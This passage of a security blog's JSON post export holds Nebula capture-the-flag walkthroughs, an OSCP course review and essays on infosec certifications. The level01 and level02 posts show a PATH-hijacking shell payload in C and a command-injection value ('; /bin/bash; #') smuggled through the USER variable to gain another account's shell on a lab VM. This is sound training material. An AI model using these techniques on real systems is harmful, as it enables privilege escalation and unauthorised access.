helps!\nMike\n",
    "ref": "/blog/exploit-exercises-nebula-level04/"
  },{
    "title": "Exploit Exercises - Nebula Level01",
    "date": "",
    "description": "",
    "body": "The next level, Level01, provides some C code for the user to evaluate. The code contains a vulnerability that allows arbitrary programs to be executed. This post will outline the steps I took to solve the challenge.\nI started by reading through the source code in order to locate the vulnerability:\n#include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;unistd.h\u0026gt; #include \u0026lt;string.h\u0026gt; #include \u0026lt;sys/types.h\u0026gt; #include \u0026lt;stdio.h\u0026gt; int main(int argc, char **argv, char **envp) { gid_t gid; uid_t uid; gid = getegid(); uid = geteuid(); setresgid(gid, gid, gid); setresuid(uid, uid, uid); system(\u0026quot;/usr/bin/env echo and now what?\u0026quot;); }  Almost immediately, I noticed that \u0026ldquo;echo\u0026rdquo; is being called without the absolute path. This is a major security vulnerability because the script will rely on the environment variables of the current shell (which can be tampered with).\nLet\u0026rsquo;s modify our path to include /tmp/:\nlevel01@nebula:/home/flag01$ PATH=/tmp:$PATH level01@nebula:/home/flag01$ export PATH level01@nebula:/home/flag01$ echo $PATH /tmp:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games  Now that /tmp is in the current path, we can create our own \u0026ldquo;echo\u0026rdquo; command. I have included C code below to spawn a shell. I used this code extensively in my OSCP studies as my payload when exploiting Linux/Unix boxes.\n#include \u0026lt;unistd.h\u0026gt; int main() { char *args[2]; args[0] = \u0026quot;/bin/sh\u0026quot;; args[1] = NULL; execve(args[0], args, NULL); }  A nice write-up on the code can be found here if you are curious about the creation and execution.\nAfter creating the new \u0026ldquo;echo\u0026rdquo; program, I need to compile the code.\nlevel01@nebula:/tmp$ gcc echo.c -o echo level01@nebula:/tmp$ ls echo echo.c vmware-root  Now I can call the original script, which will now run our \u0026ldquo;echo\u0026rdquo; program:\nlevel01@nebula:/home/flag01$ id uid=1002(level01) gid=1002(level01) groups=1002(level01) level01@nebula:/home/flag01$ ./flag01 sh-4.2$ id uid=998(flag01) gid=1002(level01) groups=998(flag01),1002(level01) sh-4.2$ getflag You have successfully executed getflag on a target account  Success!\nMike\n",
    "ref": "/blog/exploit-exercises-nebula-level01/"
  },{
    "title": "Exploit Exercises - Nebula Level02",
    "date": "",
    "description": "",
    "body": "Level02 instructs us to review some vulnerable C code and locate the attack vector. This program addresses the vulnerability from the previous level but a new vector is available.\nThe source code is included below for reference:\n#include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;unistd.h\u0026gt; #include \u0026lt;string.h\u0026gt; #include \u0026lt;sys/types.h\u0026gt; #include \u0026lt;stdio.h\u0026gt; int main(int argc, char **argv, char **envp) { char *buffer; gid_t gid; uid_t uid; gid = getegid(); uid = geteuid(); setresgid(gid, gid, gid); setresuid(uid, uid, uid); buffer = NULL; asprintf(\u0026amp;buffer, \u0026quot;/bin/echo %s is cool\u0026quot;, getenv(\u0026quot;USER\u0026quot;)); printf(\u0026quot;about to call system(\\\u0026quot;%s\\\u0026quot;)\\n\u0026quot;, buffer); system(buffer); }  As you can see, \u0026ldquo;echo\u0026rdquo; is called by its absolute path but getenv(\u0026quot;USER\u0026quot;)) is calling the environment variable $USER. Like the issue from level01, this variable is set in the current shell which can be manipulated.\nLet\u0026rsquo;s modify the $USER variable to contain different input.\nlevel02@nebula:/home/flag02$ echo ${USER} level02 level02@nebula:/home/flag02$ USER=\u0026quot;; /bin/bash; #\u0026quot; level02@nebula:/home/flag02$ echo ${USER} ; /bin/bash; #  As you can see in the code above, I modified the environment variable USER to contain \u0026quot;; /bin/bash; #\u0026quot;. The semicolons were added in order to stop the current command and start a new one, allowing us to stop the \u0026ldquo;echo\u0026rdquo; call and spawn a shell. Finally, I added an octothorp (#) in order to comment out the \u0026ldquo;is cool\u0026rdquo; line that would create malformed output.\nLet\u0026rsquo;s run flag02 and observe the results:\nlevel02@nebula:/home/flag02$ id uid=1003(level02) gid=1003(level02) groups=1003(level02) level02@nebula:/home/flag02$ ./flag02 about to call system(\u0026quot;/bin/echo ; /bin/bash; # is cool\u0026quot;) flag02@nebula:/home/flag02$ id uid=997(flag02) gid=1003(level02) groups=997(flag02),1003(level02) flag02@nebula:/home/flag02$ getflag You have successfully executed getflag on a target account  It worked! This level demonstrates the danger of using environment variables in scripts and trusting user input.\nThanks for reading!\nMike\n",
    "ref": "/blog/exploit-exercises-nebula-level02/"
  },{
    "title": "Exploit Exercises - Nebula Level00",
    "date": "",
    "description": "",
    "body": "After completing some of my certifications, I decided to get back to some of the challenges and coding practice. My good friend Kristian suggested the war games over at Exploit Exercises. Starting with Nebula, I will outline some walkthroughs of my solutions to the levels (00-19). I will split each level into a separate post in order to not spoil any of the challenges for someone just looking for a hint on a single level.\nLevel00 requires you to locate a Set User ID program that will run as the \u0026ldquo;flag00\u0026rdquo; account. The \u0026ldquo;About\u0026rdquo; section hints at checking out the man page for the find command.\nI am very familiar with the find command from my SysAdmin tasks at work, so a quick one-liner should do the trick. The command below will search the entire filesystem for any file with SUID permissions owned by the flag00 user. The last part of the command 2\u0026gt;/dev/null sends standard error to /dev/null to avoid flooding the screen with permission denied messages.\nlevel00@nebula:~$ find / -perm -4000 -user flag00 2\u0026gt;/dev/null /bin/.../flag00  The output identifies the SUID program in a \u0026ldquo;hidden\u0026rdquo; directory that meets the find commands specifications. I refer to the directory as \u0026ldquo;hidden\u0026rdquo; because if you were to run the ls command in that directory (with no additional flags), the directory would not show up in the output.\nLets run the SetUID program:\nlevel00@nebula:~$ /bin/.../flag00 Congrats, now run getflag to get your flag! flag00@nebula:~$ getflag You have successfully executed getflag on a target account flag00@nebula:~$ id uid=999(flag00) gid=1001(level00) groups=999(flag00),1001(level00)  Success! Running the SetUID program escalated us to the flag00 user.\nThis first level seems simple but is teaching a very important concept in linux security. SetUID is a special type of file permissions given to a file. When a program has the SUID bit set (-rwsr-x---), it runs as the owner of the file instead of inheriting the permissions of the logged in user. There are some programs on a Linux/Unix system that require this capability (ping and passwd). These programs need root permissions in order to perform specific tasks and alter specific files on the system. System Administrators should be very careful when setting setuid and setguid because improper use of these access modes can lead to compromise of the system.\nMike\n",
    "ref": "/blog/exploit-exercises-nebula-level00/"
  },{
    "title": "Offensive Security Certified Professional (OSCP): My Experience",
    "date": "",
    "description": "",
    "body": "Introduction It was a long ride, but I finally finished my OSCP certification by completing the lab portion and passing the practical exam. I learned so much during the course and earned what I feel is a cert worth its weight in gold. As I have mentioned in previous blog posts, I take pride in guiding my professional development and I felt that taking a hands-on penetration testing course would be a great challenge and learning experience. This post summarizes my thoughts on the entire course and process.\nCourse Registration Offensive Security (offsec) offers 30, 60, or 90 days of lab time — I selected the 90 day option. After reading a plethora of reviews, I felt that it would help me to take my time and approach the course in a way that would allow me to learn the most information possible. Just a heads up - registration does require the use of a non-free email address (no gmail, yahoo, etc). I could expand on how the process works, but other reviews do an amazing job and the official FAQ page summarizes some additional info about registration here: http://www.offensive-security.com/faq/.\nThe Course Materials The materials are provided to help guide your learning and development. Offsec supplies the student with ~300 page PDF lab guide and a number of video segments. The lab guide contains a number of exercises that will assist with learning by having the student perform the task at hand. I found myself very familiar with some topics (SSH tunneling) and completely in the dark on the others (buffer overflows). I made sure that I took the time to perform extra research and practice the topics I was not as familiar with. I do recommend completing all the exercises, because it pays off in the long run and will even assist you with some of the boxes in the lab.\nThe Lab The lab is by far the best part about this course. If you have ever spun up a vulnerable VM (metasploitable, De-ICE, etc.) to practice attacking techniques, you know that you need to configure and setup your \u0026ldquo;lab\u0026rdquo; \u0026ndash; which can result in you learning hints about the machine. The Offsec lab gives you access to ~50 machines spread out across four networks that range in difficulty which was quite a change from attacking a single vulnerable VM. As you progress in the lab, you will uncover juicy details about the users and ultimately start to refer to the machines by name - aka \u0026ldquo;last night I rooted pain.\u0026rdquo;\nPersonally, I tried to own as much of the lab as possible. It taught me so much and gaining SYSTEM/root on some of the tougher systems definitely prepared me for the practical exam. At the end of my lab time, I got all the systems with the exception of two, I decided to start preparing for the exam instead of completing these boxes.\nIn terms of documentation, it really comes down to the student. The course guide recommends KeepNote, but I was more comfortable creating a directory structure and working with flat files that aligned with my daily process at work and my IR experience. My advice is to find what style works for you and document as much as possible. Enumeration is key and it is worth keeping all of your enumeration results so you can rotate to different machines in the lab and not re-scan every time.\nIf I could change one thing about my lab time, I would have drafted the final report as I went along. I read reviews that mentioned the same tactic but it is difficult to type up your step-by-step guide when you are running around your house celebrating because you got root! I did, however, use this tactic for the exam, which I describe later.\nWhen I was concentrating on the lab, I spent around four hours a day during the week and up to eight hours on the weekends. Just a quick warning - as soon as you sign up for this course and commit to spending all your time doing it, life will get in the way. Be prepared to isolate yourself to get it done. You need to put in the proper time to truly get the most out of this course.\nThe Exam As many other OSCP reviews have mentioned, there are limitations on the use of Metasploit as well as automated vulnerability scanners such as Nessus or OpenVAS. I wouldn\u0026rsquo;t lean on these tools too heavily in the lab but do not avoid them either. The lab is there for you to try different tools and techniques and there are different ways into each box, use that practice time to your advantage.\nOffsec allots you 24 hours to complete the exam and 24 hours to draft your accompanying report. I scheduled the exam for Saturday morning and ensured that I had enough coffee, snacks, energy drinks, music, etc. for the full 48-hour period. I received the email right on time, dove into the exam guide, connected to the VPN and buckled down on achieving my goal. After about eight hours, I had enough points to pass and I focused on gathering all the information and forming a rough draft of screenshots and evidence for my report to simply the report generation. I spent another two hours drafting a complete report. The next morning, I woke up and proofread the report, and finished tweaking any formatting. After I felt comfortable with my documentation, I submitted my report and received the notification that Offensive Security had received my deliverables. I should have felt confident at this point, but I couldn\u0026rsquo;t fight the doubt that I had forgotten something. All that was eradicated when I received the notice that I had successfully completed the certification challenge early Tuesday morning.\nAs far as recommendations for the exam, make sure that you are prepared for highs and lows. There will be times during your 24 hours that you will doubt your skills and think you were not ready for the test \u0026ndash; use that time to take a break and go for a walk or grab some grub. The other tips I have for the exam are: 1.) Enumerate until you understand the box like the SysAdmin would \u0026ndash; what\u0026rsquo;s running, any special configurations, any vulnerable versions? 2.) Organize your time and don\u0026rsquo;t become hyper-focused on one machine, multitasking helps. 3.) Compile a very rough draft of your report as you go. It was so helpful to have everything prepared and laid out for my report before my VPN access was clipped. It reduced my stress about missing something important. Don\u0026rsquo;t get too excited when you root a box and forget to collect the associated information and screenshots.\nConclusion This was the most challenging and rewarding course that I have ever experienced. You truly get what you put in with the OSCP. I spent hours (cough\u0026hellip; cough\u0026hellip; days) on some of these machines and learned so much by trying different attacks in the immense \u0026ldquo;playground\u0026rdquo; that Offsec generously assembled. My recommendation for those interested in taking the course is to spend as much time in the labs as possible. The motto \u0026ldquo;Try Harder\u0026rdquo; and the more difficult boxes will frustrate you but I promise when you finish the course you will miss the lab environment. The course was well worth the time and money and I have increased not only my attacking skills, but my overall security skills in the process.\nFeel free to comment or message me on twitter if you have any questions!\n-Mike (@mikeboya)\n",
    "ref": "/blog/offensive-security-certified-professional-oscp-my-experience/"
  },{
    "title": "Blog Migration: HelloWorld2",
    "date": "",
    "description": "",
    "body": "It has been quite a while since I have posted over at IntricateDefense and although I was very busy, I decided that Blogger just wasn\u0026rsquo;t suitable for the type of content I want to share. After some searching and checking in on my buddy Jordan Wright, I decided on Octopress! For those of you who don\u0026rsquo;t know what Octopress is, you can check out (http://octopress.org/) \u0026ndash; there is some fantastic documentation about the blogging framework.\nWhat drew me over to Octopress:\n It\u0026rsquo;s called \u0026ldquo;a blogging framework for hackers\u0026rdquo;\u0026hellip; How could I pass that up?!\n It\u0026rsquo;s clean interface that\u0026rsquo;s easier to read.\n It provides a much better method for code snippets and images. I found this to be very important for a blog that contains walk-throughs with code/commands.\n It is a simple push up to Github pages, which allows me some extra control over the blog.\n  Long story short: Expect to see new posts (blah blah blah) coming here soon! Thanks for reading.\n",
    "ref": "/blog/blog-migration-helloworld2/"
  },{
    "title": "Infosec Certifications: Are They Really Worth It?",
    "date": "",
    "description": "",
    "body": "One of the most frequently asked questions I receive from individuals looking to enter the Information Security field is: \u0026ldquo;Should I pursue certifications?\u0026rdquo;\nI have had many in-depth conversation on this topic with my peers, so I\u0026rsquo;ll share my thoughts and logic on the subject here.\nThe answer to this question is not black and white \u0026ndash; it is subjective and highly dependent on the individual. I know several smart and knowledgeable professionals with 0 certifications, and an equal number of smart and knowledgeable professionals with 10-20 certs. That said, I have also met individuals with a large number of certifications who are lacking skills, and vice-versa.\nWhile some of my friends and colleagues have strict opinions on the topic, my view is this: you need to know yourself.\nI find exercise to be a helpful analogy in this case. For example: many people work out every single day and are in fantastic shape. I, however, am not one of those people. It\u0026rsquo;s difficult for me to get motivated and hit the gym \u0026ldquo;just because.\u0026rdquo; Instead, I need a short term goal in order to maintain my focus and guide my training. I recently completed my first Tough Mudder in Southern California and found it extremely beneficial to have an imminent event with a set date, motivating me to get prepared and exercise.\nAfter coming to this realization about myself, I acknowledged that the same applies to InfoSec. With a certification exam on the calendar, I\u0026rsquo;m more likely to skip an hour of TV at night and focus on studying instead. Again, this is not set in stone and I have self-taught myself on many different topics, but sometimes having an exam looming on the horizon can motivate me to really focus and learn a topic in-depth.\nI have yet to come across a course or certification from which I gained nothing, and I find that to be a telling sign that you get what you put in. As an individual who loves the command-line and prefers to cut up and massage data that way, I still found an excel course beneficial to my skillset. Others, even a few close friends of mine, are extremely skilled and do not feel the need to participate. They can stay in shape on their own, if you will.\nIn my current studies, I\u0026rsquo;ve come across two authors with the SANS GSE certification, Chris Sanders (Practical Packet Analysis, Applied NSM) and TJ O\u0026rsquo;Connor (Violent Python). With the technical knowledge and depth they broadcast through their writing and presentation of topics, I sense that a strong foundation was solidified by achieving this prestigious accolade. Just as I will continue to buy and read their work, I now view the SANS GSE as a credential I\u0026rsquo;d like to someday obtain.\nEarly in my career, I was influenced by more experienced InfoSec professionals. When making professional decisions, I would often change my own personal views depending on who I talked to. It took me a few years to realize that each decision is based on the individual and their learning style. In that respect, I hope that this post will help other young professionals.\nFor what it\u0026rsquo;s worth, having at least a few certifications will help you to get by human resources at larger companies. I won\u0026rsquo;t delve into this topic too much, but I will say that I never want to be restricted by something that is within my power to control.\nThe last point I will address is the cost of certifications. The process of using certifications to guide your short term goals can sometimes be obstructed by the financial cost of these courses. In my career, I have been lucky enough to work for a company that is invested in my training and development, fronting much of the cost for these certifications. I do have a great appreciation for companies with this mindset, though I find myself on both sides of the spectrum when it comes to paying your own way. If you are not fortunate enough to have an employer that will foot the bill as you sharpen your skill set, I would recommend that you save money and focus only on the training/certifications that will greatly increase your skills (or help you get past the HR screening process and on to a technical interview).\nOf course there are plenty of stances and opinions on the subject. If you would like to chat or share your thoughts, feel free to comment, message me on Twitter or send an email.\n-Mike (@mikeboya)\n",
    "ref": "/blog/infosec-certifications-are-they-really-worth-it/"
  },{
    "title": "Introduction",
    "date": "",
    "description": "",
    "body": "Welcome to my blog!\nThis blog will be a logbook for my interests, research and endeavors in the Information Security realm. Topics will vary, but the overall focus will combine offensive and defensive tactics to secure assets.\nI am not looking to get into a red team vs. blue team debate here, because I feel that both sides are necessary in security. The content of this blog will take a holistic view that concentrates on multiple facets of this complicated but rewarding field.\nAnyone who knows me knows that I love a good analogy, and I have found that an effective analogy for securing a network is like securing a home. You can have multiple layers of security in place already, but you still need to verify that the doors are locked.\nThe purpose of this blog is to provide a forum to discuss implementations for various security controls and testing them accordingly.\nThe content of this blog will vary based on my latest interests, but will include these general topics: Implementing security controls and services to harden a application, system or network. Analyzing popular attack patterns and attacker methods. Tools and techniques for conducting network and application assessments. Reviews of training and certifications. Secure usage of popular services and products.\nObligatory Disclaimer 1: The content and views in this blog are my own and do not reflect the ideas of my employers - past or present.\nObligatory Disclaimer 2: Any actions and or activities related to the material contained within this blog are solely your responsibility. The misuse of information within this website can result in criminal charges brought against the persons in question. The author will not be held responsible in the event of any criminal charges brought against any individuals misusing the information from this website to break the law. The offensive tactics demonstrated in this blog are only to be performed against assets that the reader owns or has received written authorization to test.\nThanks for reading!\n-Mike (@mikeboya)\n",
    "ref": "/blog/introduction/"
  }]
